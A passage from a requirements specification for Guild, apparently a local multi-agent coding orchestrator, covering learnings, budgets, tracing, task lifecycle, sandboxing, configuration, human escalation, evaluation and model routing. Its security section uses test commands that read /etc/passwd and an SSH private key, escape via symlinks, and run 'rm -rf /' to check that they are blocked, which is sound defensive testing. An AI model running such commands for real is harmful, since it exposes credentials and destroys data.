- AC-09.5.3: `guild learnings reject <id>` removes a learning
  - verify: Reject a learning -> it no longer appears in `guild learnings` or in agent context

**REQ-09.6 — Cross-task learning: patterns from task A inform task B**

- AC-09.6.1: A learning extracted from task A is available when starting task B
  - verify: Task A produces learning "use pathlib for paths" -> start task B in a related area -> learning appears in agent context
- AC-09.6.2: Irrelevant learnings are not injected into unrelated tasks
  - verify: Learning scoped to "database" module -> task in "CLI" module does not receive it

**REQ-09.7 — Block-level learning: learnings scoped to specific blocks**

- AC-09.7.1: A learning can be stored with a `scope` tied to a specific block name
  - verify: Add a learning with `scope="coder"` -> stored learning has `scope` field set to `"coder"`
- AC-09.7.2: `list_learnings(scope="coder")` returns only learnings scoped to that block
  - verify: Store learnings with scopes "coder", "reviewer", and None -> filtering by "coder" returns only the coder-scoped learning
- AC-09.7.3: Unscoped learnings are available to all blocks
  - verify: Store a learning with `scope=None` -> it is returned by `list_learnings()` regardless of scope filter

**REQ-09.8 — Learning decay: old unvalidated learnings lose confidence**

- AC-09.8.1: Unvalidated learnings lose confidence over time
  - verify: Create a learning, run no tasks for the configured decay period -> confidence has decreased from its initial value
- AC-09.8.2: Validated learnings do not decay
  - verify: Create a learning, validate it in 3 tasks, wait the decay period -> confidence remains at or above its post-validation level
- AC-09.8.3: Learnings that decay below a minimum threshold are archived
  - verify: Learning confidence decays to 0.05 -> it is removed from active learnings and moved to archive

**REQ-09.9 — Prompt refinement suggestions**

- AC-09.9.1: Learner identifies recurring issues and suggests prompt changes
  - verify: Agent fails the same type check 3 times across tasks -> learner produces a suggestion "Add 'always check return types' to the reviewer prompt"
- AC-09.9.2: Suggestions are presented to the user for review, not auto-applied
  - verify: Prompt suggestion is generated -> `guild learnings --suggestions` shows it; it is not automatically injected into any prompt

### REQ-10: Cost & Resource Tracking

**Goal:** Know what your agents are consuming and set limits.

| ID | Requirement | Notes |
|----|-------------|-------|
| REQ-10.1 | Token usage tracking per agent, per task, per session | Input tokens, output tokens, total |
| REQ-10.2 | Budget limits — max tokens, max time, max tool calls | Per-agent and per-task |
| REQ-10.3 | Resource summary in CLI | Real-time and historical |
| REQ-10.4 | Alerts when approaching limits | Configurable thresholds (80%, 90%, 100%) |
| REQ-10.5 | Cost estimation for cloud providers (when used) | Map tokens to approximate $ |

#### Acceptance Criteria (REQ-10.1 through REQ-10.5)

**REQ-10.1 — Token usage tracking per agent, per task, per session**

- AC-10.1.1: Every LLM call records input tokens, output tokens, and total tokens
  - verify: Run a task with 3 LLM turns -> `guild usage` shows per-turn token counts that sum to the session total
- AC-10.1.2: Token usage is attributed to the correct agent and task
  - verify: Run two tasks with different agents -> `guild usage --task <id>` shows only tokens for that task
- AC-10.1.3: Token data persists across restarts
  - verify: Run a task, restart Guild, run `guild usage` -> previous task token data is present

**REQ-10.2 — Budget limits -- max tokens, max time, max tool calls**

- AC-10.2.1: Agent stops when token budget is exhausted
  - verify: Set `budget.max_tokens = 500` for a task -> agent stops with status `budget_exceeded` before exceeding 500 total tokens
- AC-10.2.2: Agent stops when time budget is exhausted
  - verify: Set `budget.max_time_seconds = 10` -> agent stops with status `budget_exceeded` within 2 seconds of the limit
- AC-10.2.3: Agent stops when tool call budget is exhausted
  - verify: Set `budget.max_tool_calls = 3` -> agent stops after exactly 3 tool calls with status `budget_exceeded`
- AC-10.2.4: Budget can be set per-agent and per-task independently
  - verify: Set agent-level budget of 1000 tokens and task-level budget of 500 tokens -> task-level limit triggers first
- AC-10.2.5: Before each LLM call, the agent loop checks remaining token budget; if exhausted, the loop exits immediately
  - verify: Set `budget.max_tokens = 100`, run a task that would use 500 tokens -> agent exits after the first LLM call that pushes total above 100, not after the second
- AC-10.2.6: A budget-exceeded task's status is persisted in storage as `budget_exceeded` and survives restart
  - verify: Task stops due to budget -> restart Guild -> `guild status <task_id>` shows `budget_exceeded`

**REQ-10.3 — Resource summary in CLI**

- AC-10.3.1: `guild usage` displays a summary table of token consumption
  - verify: Run `guild usage` after completing a task -> output shows a table with columns for task, agent, input tokens, output tokens, total tokens
- AC-10.3.2: `guild usage --task <id>` shows per-turn detail for a specific task
  - verify: Run `guild usage --task <id>` -> output shows each LLM turn with timestamp and token counts

**REQ-10.4 — Alerts when approaching limits**

- AC-10.4.1: A warning is logged when usage crosses a configured threshold
  - verify: Set `budget.max_tokens = 1000` and `budget.alert_thresholds = [80]` -> log contains a warning when cumulative tokens exceed 800
- AC-10.4.2: Multiple threshold levels fire independently
  - verify: Set `budget.alert_thresholds = [80, 90]` -> two distinct warnings appear at 80% and 90% usage
- AC-10.4.3: No alert fires if usage stays below the lowest threshold
  - verify: Set `budget.max_tokens = 10000` and `budget.alert_thresholds = [80]` -> task completes at 500 tokens with no budget warning in logs

**REQ-10.5 — Cost estimation for cloud providers (when used)**

- AC-10.5.1: Cost estimate is calculated using configured per-token pricing
  - verify: Set `provider.cost_per_1k_input = 0.01` and `provider.cost_per_1k_output = 0.03` -> `guild usage` shows estimated cost matching `(input_tokens * 0.01 + output_tokens * 0.03) / 1000`
- AC-10.5.2: Cost is zero when using a local provider with no pricing configured
  - verify: Use Ollama with no cost config -> `guild usage` shows `$0.00` for cost
- AC-10.5.3: Cost estimation handles multiple providers in the same session
  - verify: Task uses local model then escalates to cloud model -> cost reflects only the cloud model's token usage at cloud pricing
- AC-10.5.4: Custom per-token pricing can be set via config and overrides the built-in cost table
  - verify: Set `provider.cost_per_1k_input = 0.05` in config -> `guild usage` uses the custom rate, not the built-in default

### REQ-11: Observability & Debugging

**Goal:** Full visibility into what agents are doing and why.

| ID | Requirement | Notes |
|----|-------------|-------|
| REQ-11.1 | Full reasoning chain trace (not just final output) | Every LLM call, tool call, decision point |
| REQ-11.2 | Session replay from logs | Re-watch what happened step by step |
| REQ-11.3 | Structured logging with configurable levels | Debug, Info, Warn, Error |
| REQ-11.4 | Error recovery — restart crashed agents from last checkpoint | Automatic or manual |
| REQ-11.5 | Log export in standard formats (JSON, OpenTelemetry) | For external observability tools |

#### Acceptance Criteria (REQ-11.1 through REQ-11.5)

**REQ-11.1 — Full reasoning chain trace (not just final output)**

- AC-11.1.1: Every LLM call is recorded with its full prompt and response
  - verify: Run a task -> session trace in SQLite contains all LLM requests and responses including system prompt, user messages, and assistant replies
- AC-11.1.2: Every tool call is recorded with arguments and result
  - verify: Run a task that calls 2 tools -> trace entries include tool name, input arguments, output result, and duration for each call
- AC-11.1.3: Decision points are recorded with rationale
  - verify: Run a task where the agent chooses between approaches -> trace contains a decision entry with alternatives considered and reason for selection
- AC-11.1.4: Trace events are persisted to SQLite on every turn boundary, not just held in memory
  - verify: Kill the agent process after 5 turns -> query SQLite trace table -> all 5 turns' trace events are present

**REQ-11.2 — Session replay from logs**

- AC-11.2.1: A completed session can be replayed step-by-step
  - verify: Run `guild replay <task_id>` -> outputs each turn in chronological order (LLM call, tool call, result) with timestamps
- AC-11.2.2: Replay includes tool call inputs and outputs
  - verify: Replay a session that used file_read -> replay output shows the file path requested and the content returned
- AC-11.2.3: Replay of a non-existent session produces a clear error
  - verify: Run `guild replay nonexistent-id` -> error message says "No session found with ID nonexistent-id"
- AC-11.2.4: Each replayed message includes its timestamp in the display output
  - verify: Replay a session -> each line includes an ISO timestamp before the role marker

**REQ-11.3 — Structured logging with configurable levels**

- AC-11.3.1: Log level is configurable via config file
  - verify: Set `logging.level = "DEBUG"` in config -> debug-level messages appear in output
- AC-11.3.2: Default log level is INFO
  - verify: Start Guild with default config -> INFO messages appear, DEBUG messages do not
- AC-11.3.3: Log entries include timestamp, level, module, and message
  - verify: Inspect any log line -> it contains ISO timestamp, level (DEBUG/INFO/WARN/ERROR), source module name, and message text

**REQ-11.4 — Error recovery -- restart crashed agents from last checkpoint**

- AC-11.4.1: A crashed agent can be resumed from its last checkpoint
  - verify: Kill the agent process mid-task -> run `guild resume <task_id>` -> agent continues from the last completed turn, not from the beginning
- AC-11.4.2: Resume detects and reports the crash reason if available
  - verify: Kill agent with SIGKILL -> `guild resume <task_id>` outputs "Recovering from interrupted state" with the last known turn number
- AC-11.4.3: When `daemon.auto_recovery = true`, a crashed agent loop is automatically restarted from the last checkpoint
  - verify: Enable auto_recovery, kill the agent loop (not the daemon) -> daemon detects the crash and resumes the agent automatically within one supervisor poll interval

**REQ-11.5 — Log export in standard formats (JSON, OpenTelemetry)**

- AC-11.5.1: Session logs can be exported as JSON
  - verify: Run `guild logs <task_id> --format json` -> output is valid JSON with an array of log entries
- AC-11.5.2: Session logs can be exported in OpenTelemetry-compatible format
  - verify: Run `guild logs <task_id> --format otlp` -> output contains spans with trace_id, span_id, timestamps, and attributes matching OTLP schema
- AC-11.5.3: Export of an empty session produces a valid but empty structure
  - verify: Export logs for a task with zero turns -> output is valid JSON with an empty array (not an error)

### REQ-12: Task Specification & Acceptance Criteria

**Goal:** Structured way to define what "done" means so agents can self-verify.

| ID | Requirement | Notes |
|----|-------------|-------|
| REQ-12.1 | Task definition format with description, acceptance criteria, verification steps | YAML/TOML/Markdown |
| REQ-12.2 | Verification step execution — run tests, check files, validate output | Automated pass/fail |
| REQ-12.3 | Task decomposition tracking — see how orchestrator broke down a task | Tree view |
| REQ-12.4 | Task dependencies — "do B after A completes" | DAG-based scheduling |
| REQ-12.5 | Task status lifecycle: pending → in-progress → verifying → done/failed/blocked | Clear state machine |

#### Acceptance Criteria (REQ-12.1 through REQ-12.5)

**REQ-12.1 — Task definition format with description, acceptance criteria, verification steps**

- AC-12.1.1: A task can be defined with a structured spec containing description, acceptance criteria, and verification steps
  - verify: Create a task spec YAML with `description`, `acceptance_criteria`, and `verification_steps` fields -> `guild task --spec task.yaml` loads and uses all three fields
- AC-12.1.2: A task without acceptance criteria is accepted but flagged as unverifiable
  - verify: Create a task spec with description only (no acceptance_criteria) -> task runs with a warning "No acceptance criteria defined; self-verification skipped"
- AC-12.1.3: Malformed task spec is rejected at load time
  - verify: Create a YAML file with invalid structure (missing `description`) -> `guild task --spec bad.yaml` fails with a validation error naming the missing field
- AC-12.1.4: When a task has no acceptance_criteria, a log warning "No acceptance criteria defined; self-verification skipped" is emitted before the agent begins work
  - verify: Create a task spec with description only (no acceptance_criteria) -> task runs with a warning "No acceptance criteria defined; self-verification skipped" in the log output

**REQ-12.2 — Verification step execution -- run tests, check files, validate output**

- AC-12.2.1: Verification steps are executed automatically after the agent marks a task as done
  - verify: Define a task with verification step `pytest tests/foo.py` -> agent completes work, then verification runs automatically and result is recorded as pass/fail
- AC-12.2.2: A failing verification step marks the task as failed, not done
  - verify: Define a task with verification step that checks for a file that the agent did not create -> task status is `failed` with verification failure details
- AC-12.2.3: Multiple verification steps run in sequence; first failure stops remaining steps
  - verify: Define 3 verification steps where the 2nd fails -> only steps 1 and 2 execute; step 3 is skipped; task status shows which step failed
- AC-12.2.4: Verification commands that exceed the configured timeout are killed and treated as failures
  - verify: Set verification timeout to 5 seconds, define a verification step that runs `sleep 30` -> step is killed after 5s and marked as failed with "timeout" reason

**REQ-12.3 — Task decomposition tracking -- see how orchestrator broke down a task**

- AC-12.3.1: Subtasks created by decomposition are linked to their parent task
  - verify: Run a task that decomposes into 3 subtasks -> `guild history --task <parent_id>` shows a tree with parent and 3 children
- AC-12.3.2: Subtask status rolls up to the parent
  - verify: Complete 2 of 3 subtasks -> parent status shows `in-progress` with "2/3 subtasks done"
- AC-12.3.3: `guild history --task <parent_id> --tree` renders a visual tree showing each subtask's description and status
  - verify: Run a task that decomposes into 3 subtasks -> `guild history --task <parent_id> --tree` displays an indented tree with parent and child tasks

**REQ-12.4 — Task dependencies -- "do B after A completes"**

- AC-12.4.1: A task with a dependency waits until the dependency completes
  - verify: Create task B with `depends_on: [task_A_id]` -> task B stays `pending` until task A reaches `done`, then B transitions to `in-progress`
- AC-12.4.2: A dependency that fails blocks the dependent task
  - verify: Task A fails -> dependent task B transitions to `blocked` with reason "dependency task_A failed"
- AC-12.4.3: Circular dependencies are detected at definition time
  - verify: Create task A depending on B and B depending on A -> error "Circular dependency detected: A -> B -> A"
- AC-12.4.4: `TaskGraph.add_task()` validates acyclicity; adding a node that creates a cycle raises `CircularDependencyError`
  - verify: Add task A depends_on B, then add task B depends_on A -> raises error with cycle path

**REQ-12.5 — Task status lifecycle: pending -> in-progress -> verifying -> done/failed/blocked**

- AC-12.5.1: Tasks transition through the defined states in order
  - verify: Run a task with verification steps -> status transitions observed in audit log: `pending` -> `in-progress` -> `verifying` -> `done`
- AC-12.5.2: Invalid state transitions are rejected
  - verify: Attempt to transition a `done` task to `in-progress` programmatically -> raises `InvalidStateTransition` error
- AC-12.5.3: `guild status <task_id>` shows the current lifecycle state
  - verify: Query a running task -> output includes current state (e.g., "in-progress") with time spent in that state
- AC-12.5.4: Each state transition records a timestamp, and `guild status <task_id>` shows how long the task has been in its current state
  - verify: Task transitions from pending to in-progress -> `guild status <task_id>` shows elapsed time in the current state

### REQ-13: Security & Sandboxing

**Goal:** Protect the host system from runaway agent behavior.

| ID | Requirement | Notes |
|----|-------------|-------|
| REQ-13.1 | Sandboxed execution for shell commands | Container, chroot, or OS-level sandboxing |
| REQ-13.2 | Network access controls per agent | Allow/deny internet, localhost only, etc. |
| REQ-13.3 | Secret management — agents use API keys without seeing raw values | Injected at runtime, masked in logs |
| REQ-13.4 | File system boundaries — agents can only access allowed paths | Enforced by Guild, not by convention |
| REQ-13.5 | Command allowlist/denylist | Block dangerous commands |

#### Acceptance Criteria (REQ-13.1 through REQ-13.5)

**REQ-13.1 — Sandboxed execution for shell commands**

- AC-13.1.1: Shell commands execute inside a sandbox that restricts filesystem access
  - verify: Agent runs `cat /etc/passwd` from within sandbox -> command fails with permission denied or sandbox violation error
- AC-13.1.2: Sandbox escape attempts are detected and logged
  - verify: Agent runs a command that attempts to break out of the sandbox (e.g., symlink traversal) -> command is blocked and an audit log entry records the attempt
- AC-13.1.3: Sandbox is configurable per security profile
  - verify: Set `security.sandbox = "strict"` -> only project directory is accessible; set `security.sandbox = "permissive"` -> home directory is also accessible
- AC-13.1.4: Shell commands that pass policy checks are executed within an OS-level sandbox that enforces filesystem boundaries at the kernel level
  - verify: On macOS, shell command executes within `sandbox-exec` constraints; on Linux, within a namespace-restricted environment

**REQ-13.2 — Network access controls per agent**

- AC-13.2.1: Network access can be restricted to localhost only
  - verify: Set `security.network = "localhost"` for an agent -> agent tool that attempts an outbound HTTP request to an external host is blocked
- AC-13.2.2: Network access can be fully denied
  - verify: Set `security.network = "none"` -> any network call from agent tools fails with "Network access denied by policy"
- AC-13.2.3: Default network policy allows all access
  - verify: Start agent with no network config -> agent can reach both localhost and external hosts
- AC-13.2.4: When `security.network = "none"`, the shell tool wraps commands in a network-restricted execution environment
  - verify: Set network to "none", run `curl http://example.com` via shell tool -> command fails with network error

**REQ-13.3 — Secret management -- agents use API keys without seeing raw values**

- AC-13.3.1: Secrets are injected at runtime and not visible in agent context
  - verify: Configure a secret `API_KEY=abc123` -> agent's tool receives the value, but the LLM conversation history shows `[REDACTED]` instead of `abc123`
- AC-13.3.2: Secrets are masked in all log output
  - verify: A tool returns output containing the secret value -> log entry replaces the secret with `***`
- AC-13.3.3: Attempting to read the secret store file directly is blocked
  - verify: Agent uses file_read tool on `.guild/secrets` -> tool returns "Access denied: secrets file is protected"

**REQ-13.4 — File system boundaries -- agents can only access allowed paths**

- AC-13.4.1: File operations outside the allowed path are rejected
  - verify: Set `security.allowed_paths = ["/project"]` -> agent attempts `file_read("/home/user/.ssh/id_rsa")` -> tool returns "Path /home/user/.ssh/id_rsa is outside allowed boundaries"
- AC-13.4.2: Symlinks that resolve outside allowed paths are rejected
  - verify: Create a symlink inside the project pointing to `/etc` -> agent attempts to read via the symlink -> tool rejects with boundary violation
- AC-13.4.3: Allowed paths support glob patterns
  - verify: Set `security.allowed_paths = ["/project", "/tmp/guild-*"]` -> agent can read `/tmp/guild-work/file.txt` but not `/tmp/other/file.txt`

**REQ-13.5 — Command allowlist/denylist**

- AC-13.5.1: Commands on the denylist are blocked before execution
  - verify: Denylist contains `rm -rf /` -> agent attempts to run `rm -rf /` -> tool returns "Command blocked by denylist" and command does not execute
- AC-13.5.2: Denylist uses pattern matching, not exact string match
  - verify: Denylist contains pattern `rm -rf *` -> agent runs `rm -rf ./src` -> command is blocked
- AC-13.5.3: Allowlist mode blocks all commands not on the list
  - verify: Set `security.command_mode = "allowlist"` with `security.allowed_commands = ["python", "pytest"]` -> agent runs `curl http://example.com` -> command is blocked with "Command not in allowlist"

### REQ-14: Configuration as Code

**Goal:** Everything configurable via version-controlled files.

| ID | Requirement | Notes |
|----|-------------|-------|
| REQ-14.1 | Agent definitions in config files (TOML) | Name, role, model, system prompt, tools, permissions |
| REQ-14.2 | Team compositions as named configs | "coding-team", "research-team", "solo-debug" |
| REQ-14.3 | Permission profiles as named configs | "safe", "dev-work", "full-auto" |
| REQ-14.4 | Environment-specific overrides | Dev vs. CI settings |
| REQ-14.5 | Config validation on startup | Fail fast with clear error messages |
| REQ-14.6 | Config hot-reload where possible | Change config without restart |

#### Acceptance Criteria (REQ-14.1 through REQ-14.6)

**REQ-14.1 — Agent definitions in config files (TOML)**

- AC-14.1.1: An agent can be fully defined in a TOML config file
  - verify: Create `.guild/agents/coder.toml` with `name`, `role`, `model`, `system_prompt`, `tools`, and `permissions` -> `guild task --agent coder "write a function"` loads and uses that agent definition
- AC-14.1.2: Missing required fields produce a clear validation error
  - verify: Create an agent TOML missing the `model` field -> startup error: "Agent 'coder' missing required field: model"
- AC-14.1.3: Agent config supports referencing named permission profiles
  - verify: Set `permissions = "safe"` in agent TOML -> agent loads the "safe" permission profile defined in `profiles.toml`
- AC-14.1.4: `validate_config()` flags agents with `model = None` as warnings (the agent cannot function without a model)
  - verify: Define an agent profile with no model field -> startup warns "Agent 'coder' has no model configured"

**REQ-14.2 — Team compositions as named configs**

- AC-14.2.1: A team composition can be loaded by name
  - verify: Define `[teams.coding-team]` in config with orchestrator and workers -> `guild task --team coding-team "build feature"` launches the defined team
- AC-14.2.2: Referencing a non-existent team name produces a clear error
  - verify: Run `guild task --team nonexistent "do something"` -> error: "Team 'nonexistent' not found in configuration"

**REQ-14.3 — Permission profiles as named configs**

- AC-14.3.1: Named permission profiles map to specific tier configurations
  - verify: Define `[profiles.safe]` with `tier = 1` and tool restrictions -> loading profile "safe" applies Tier 1 (Ask) permissions with those restrictions
- AC-14.3.2: Multiple profiles can coexist and be switched at runtime
  - verify: Define "safe" and "full-auto" profiles -> switch from "safe" to "full-auto" via `guild config --set permissions.profile=full-auto` -> agent immediately operates at the new tier
- AC-14.3.3: Changing `permissions.profile` in the config file while the agent is running triggers a config reload that applies the new permission tier
  - verify: Change profile in config.toml mid-task -> next tool call uses the new tier's rules within one config poll interval

**REQ-14.4 — Environment-specific overrides**

- AC-14.4.1: Environment-specific config files override base config
  - verify: Set `provider.model = "gemma4:4b"` in `guild.toml` and `provider.model = "gemma4:1b"` in `guild.ci.toml` -> running with `GUILD_ENV=ci` uses `gemma4:1b`
- AC-14.4.2: Base config values are preserved when not overridden
  - verify: Set `provider.base_url` only in `guild.toml` -> running with `GUILD_ENV=ci` still uses that base_url

**REQ-14.5 — Config validation on startup**

- AC-14.5.1: Invalid config values are caught at startup with field-level error messages
  - verify: Set `provider.temperature = "hot"` -> startup fails with "Validation error in provider.temperature: expected float, got string"
- AC-14.5.2: Unknown config keys produce a warning
  - verify: Add `provider.typo_field = true` to config -> startup logs a warning "Unknown config key: provider.typo_field"
- AC-14.5.3: Config with no errors starts cleanly with no validation warnings
  - verify: Use a valid default config -> startup produces no validation warnings or errors
- AC-14.5.4: Unknown config keys that do not match any `GuildConfig` field produce a log warning
  - verify: Add `provider.typo_field = true` to config -> startup logs a warning "Unknown config key: provider.typo_field"

**REQ-14.6 — Config hot-reload where possible**

- AC-14.6.1: Changing a hot-reloadable config value takes effect without restart
  - verify: While agent is running, change `resource.mode = "stealth"` in config file -> within 10 seconds, `guild resource-status` shows mode as "stealth"
- AC-14.6.2: Non-reloadable config changes are deferred to next restart
  - verify: Change `provider.model` while agent is running -> log message: "Config change to provider.model requires restart to take effect"
- AC-14.6.3: Config syntax errors during hot-reload do not crash the running agent
  - verify: Introduce a TOML syntax error in config while agent is running -> agent logs "Config reload failed: TOML parse error at line N" and continues with previous config
- AC-14.6.4: Changing `provider.model` while the agent is running logs a "requires restart" message rather than applying immediately
  - verify: Change `provider.model` in config while agent is running -> log message: "Config change to provider.model requires restart to take effect"

### REQ-15: Human-in-the-Loop Escalation Patterns

**Goal:** Smart escalation that doesn't block all work when one thing needs human input.

| ID | Requirement | Notes |
|----|-------------|-------|
| REQ-15.1 | Asynchronous question queue — agent posts question, continues other work | Non-blocking escalation |
| REQ-15.2 | **Presence-aware notification** — when user is active, notify immediately; when idle/sleeping, queue silently | Tied to resource monitor's activity detection |
| REQ-15.3 | Escalation context — full history of what was tried before escalating | Human gets enough context to answer quickly |
| REQ-15.4 | Batch approval — review multiple pending requests at once | Efficient for returning after AFK |
| REQ-15.5 | Notification channels: desktop toast, terminal bell, webhook — configurable | Different channels for different presence states |

#### Acceptance Criteria (REQ-15.1 through REQ-15.5)

**REQ-15.1 — Asynchronous question queue -- agent posts question, continues other work**

- AC-15.1.1: Agent posts a question to the queue without blocking the agent loop
  - verify: Agent encounters an ambiguity, posts a question -> agent continues executing the next subtask within the same turn (does not wait for answer)
- AC-15.1.2: Queued questions are retrievable via CLI
  - verify: Agent posts 2 questions -> `guild questions` lists both with timestamps, task IDs, and question text
- AC-15.1.3: Answering a question delivers the answer to the agent on its next turn
  - verify: Run `guild answer <question_id> "use approach A"` -> on the agent's next LLM call, the answer is included in the context

**REQ-15.2 — Presence-aware notification -- when user is active, notify immediately; when idle/sleeping, queue silently**

- AC-15.2.1: When user is active, escalation triggers an immediate notification
  - verify: Resource monitor reports `active` state -> agent escalates -> desktop toast or terminal bell fires within 2 seconds
- AC-15.2.2: When user is idle, escalation is queued silently
  - verify: Resource monitor reports `idle` state -> agent escalates -> no notification fires; question appears in `guild questions` queue
- AC-15.2.3: Queued notifications are delivered when user returns to active
  - verify: User was idle with 2 queued questions -> user becomes active -> both notifications fire within 10 seconds of activity detection
- AC-15.2.4: Notifier checks user presence state from the resource monitor before dispatching
  - verify: Resource monitor reports `idle` -> agent escalates -> Notifier queries activity state and queues the notification instead of firing immediately

**REQ-15.3 — Escalation context -- full history of what was tried before escalating**

- AC-15.3.1: Escalation includes a summary of attempted approaches
  - verify: Agent tries approaches A and B, both fail, then escalates -> question context includes "Tried: A (failed: reason), B (failed: reason)"
- AC-15.3.2: Escalation includes the specific blocker
  - verify: Agent escalates -> question text states what specifically is needed from the human (e.g., "Need clarification on: should the API return 404 or empty array for no results?")

**REQ-15.4 — Batch approval -- review multiple pending requests at once**

- AC-15.4.1: Multiple pending permission requests can be approved in one command
  - verify: 3 pending tool approvals queued -> `guild approve --all` approves all 3 and agent resumes work on each
- AC-15.4.2: Selective batch approval is supported
  - verify: 3 pending requests -> `guild approve <id1> <id3>` approves only those two; `<id2>` remains pending
- AC-15.4.3: `guild approve --all` CLI command exists and approves all pending questions
  - verify: 3 pending questions queued -> `guild approve --all` approves all 3 and agent resumes work on each
- AC-15.4.4: `guild approve <id1> <id3>` CLI command selectively approves specific questions
  - verify: 3 pending questions -> `guild approve <id1> <id3>` approves only those two; `<id2>` remains pending

**REQ-15.5 — Notification channels: desktop toast, terminal bell, webhook -- configurable**

- AC-15.5.1: Desktop toast notification fires when configured
  - verify: Set `notifications.channels = ["desktop"]` -> escalation triggers an OS-native notification (macOS notification center, Linux notify-send)
- AC-15.5.2: Webhook notification fires with correct payload
  - verify: Set `notifications.channels = ["webhook"]` and `notifications.webhook_url = "http://localhost:9999/hook"` -> escalation sends a POST with JSON body containing `task_id`, `question`, and `timestamp` to that URL
- AC-15.5.3: Multiple channels fire simultaneously
  - verify: Set `notifications.channels = ["desktop", "webhook"]` -> escalation triggers both desktop toast and webhook POST
- AC-15.5.4: Invalid webhook URL is handled gracefully
  - verify: Set webhook URL to unreachable host -> escalation logs "Webhook notification failed: connection refused" and does not crash the agent
- AC-15.5.5: Webhook payload contains structured fields (`task_id`, `question`, `timestamp`), not just a text string
  - verify: Trigger a webhook notification -> POST body contains JSON with `task_id`, `question`, and `timestamp` fields

### REQ-16: Testing & Evaluation Framework

**Goal:** Measure and compare agent performance systematically.

| ID | Requirement | Notes |
|----|-------------|-------|
| REQ-16.1 | A/B testing — same task, different models/configs, compare results | Side-by-side output comparison |
| REQ-16.2 | Benchmark suite — standard tasks for regression testing | Customizable per project |
| REQ-16.3 | Regression detection — alert when config changes degrade performance | Automated comparison against baseline |
| REQ-16.4 | Eval metrics — task completion rate, time, token usage, tool calls | Quantitative and qualitative |
| REQ-16.5 | Eval results stored and browsable | Historical trends |
| REQ-16.6 | **Progressive confidence building** — benchmarks → self-development → real projects | Trust in the system built incrementally through demonstrated capability |
| REQ-16.7 | **Self-development benchmark** — Guild can implement its own P1 features autonomously | If it can develop itself, it can develop other projects |


#### Acceptance Criteria (REQ-16.1 through REQ-16.7)

**REQ-16.1 — A/B testing -- same task, different models/configs, compare results**

- AC-16.1.1: The same task can be run with two different configs and results compared
  - verify: Run `guild eval --ab --config-a model=gemma4:4b --config-b model=gemma4:1b --task "write fizzbuzz"` -> output shows side-by-side comparison of completion status, token usage, and time for each config
- AC-16.1.2: A/B results are stored for later retrieval
  - verify: Run an A/B test -> `guild eval history` lists the comparison with both run IDs and their metrics
- AC-16.1.3: A/B test with identical configs produces a valid comparison (baseline check)
  - verify: Run A/B with the same config -> results show both runs completed with comparable metrics (no error from identical configs)

**REQ-16.2 — Benchmark suite -- standard tasks for regression testing**

- AC-16.2.1: A benchmark suite can be defined as a set of task specs
  - verify: Create `.guild/benchmarks/core.toml` with 3 task definitions -> `guild eval --suite core` runs all 3 tasks and reports per-task results
- AC-16.2.2: Custom benchmark suites can be created per project
  - verify: Define a project-specific suite with domain tasks -> `guild eval --suite custom` runs those tasks and produces results

**REQ-16.3 — Regression detection -- alert when config changes degrade performance**

- AC-16.3.1: Regression is detected when metrics drop below baseline
  - verify: Establish a baseline with completion rate 100% -> change config and re-run suite with completion rate 66% -> output includes "REGRESSION: completion rate dropped from 100% to 66%"
- AC-16.3.2: No regression alert when metrics are stable or improved
  - verify: Run suite twice with same config -> no regression warning in output

**REQ-16.4 — Eval metrics -- task completion rate, time, token usage, tool calls**

- AC-16.4.1: Each eval run records completion rate, elapsed time, total tokens, and tool call count
  - verify: Run a benchmark suite of 3 tasks -> results table includes columns: task, completed (bool), time (seconds), tokens (total), tool_calls (count)
- AC-16.4.2: Aggregate metrics are computed across the suite
  - verify: Run a 3-task suite where 2 succeed -> aggregate shows "Completion: 2/3 (66.7%), Avg time: Xs, Total tokens: N"

**REQ-16.5 — Eval results stored and browsable**

- AC-16.5.1: Eval results are persisted in SQLite
  - verify: Run a benchmark suite -> `guild eval history` shows the run with date, suite name, and summary metrics
- AC-16.5.2: Historical results can be compared across runs
  - verify: Run the same suite twice on different dates -> `guild eval compare <run1> <run2>` shows a delta table of metrics

**REQ-16.6 — Progressive confidence building -- benchmarks -> self-development -> real projects**

- AC-16.6.1: A confidence level is tracked per capability area
  - verify: Run benchmarks in "code-generation" category -> `guild eval confidence` shows a confidence score for code-generation based on pass rate across runs
- AC-16.6.2: Confidence increases after repeated successful runs
  - verify: Run the same suite 3 times with 100% pass -> confidence score for that category increases from initial to elevated level
- AC-16.6.3: `guild eval confidence` displays per-category confidence scores
  - verify: Run benchmarks in "code-generation" category -> `guild eval confidence` shows a confidence score for code-generation based on pass rate across runs

**REQ-16.7 — Self-development benchmark -- Guild can implement its own P1 features autonomously**

- AC-16.7.1: A self-development benchmark suite exists that tasks the agent with implementing Guild features
  - verify: Run `guild eval --suite self-dev` -> suite contains tasks like "add a new CLI command" and "write tests for module X"
- AC-16.7.2: Self-development results track whether generated code passes tests
  - verify: Agent completes a self-dev task -> results include whether `pytest` passed on the generated code
- AC-16.7.3: Self-development benchmarks include Guild-specific tasks (not just generic file manipulation)
  - verify: Run `guild eval --suite self-dev` -> suite contains tasks like "add a new CLI command" and "write tests for module X"
- AC-16.7.4: Self-development task completion is verified by running `pytest` on generated code, not just LLM response behavior
  - verify: Agent generates code for a self-dev task -> verification step runs `pytest` and task is marked done only if tests pass

### REQ-17: Multi-Model Routing & Escalation

**Goal:** Use the right model for the right job. Escalate to smarter models when stuck, including external CLI tools.

| ID | Requirement | Notes |
|----|-------------|-------|
| REQ-17.1 | Per-agent model assignment | Orchestrator = strong, workers = fast/cheap |
| REQ-17.2 | Fallback chains — if primary model is down/slow, use backup | Ollama → cloud, or large → small |
| REQ-17.3 | **Use cheap models for cheap decisions** | Permission checks, safety screening — smallest model that works |
| REQ-17.4 | Model capability tagging — match task requirements to model strengths | "needs code generation" → code-specialized model |
| REQ-17.5 | **Stuck-triggered escalation** — when stuck detector fires, automatically retry with next model in chain | Default chain: fast local → smart local → external CLI → human |
| REQ-17.6 | **External CLI tool as provider** — shell out to installed CLI tools (e.g., `gemini`, `claude`) as escalation providers | Parse text response; structured tool calling not required at this tier |
| REQ-17.7 | Escalation chain configurable per-project | `[escalation] chain = ["gemma4-4b", "gemma4-26b", "gemini-cli"]` |
| REQ-17.8 | **Malformed output recovery** — retry with correction hint, then escalate model, then exhaust chain, only then human | Retry 1-2x with "your response was malformed" hint before escalating |

#### Acceptance Criteria (REQ-17.1 through REQ-17.8)

**REQ-17.1 — Per-agent model assignment**

- AC-17.1.1: Each agent can be configured with a different model
  - verify: Configure orchestrator with `model = "gemma4:26b"` and worker with `model = "gemma4:4b"` -> orchestrator LLM calls use gemma4:26b and worker calls use gemma4:4b
- AC-17.1.2: Default model is used when no per-agent model is specified
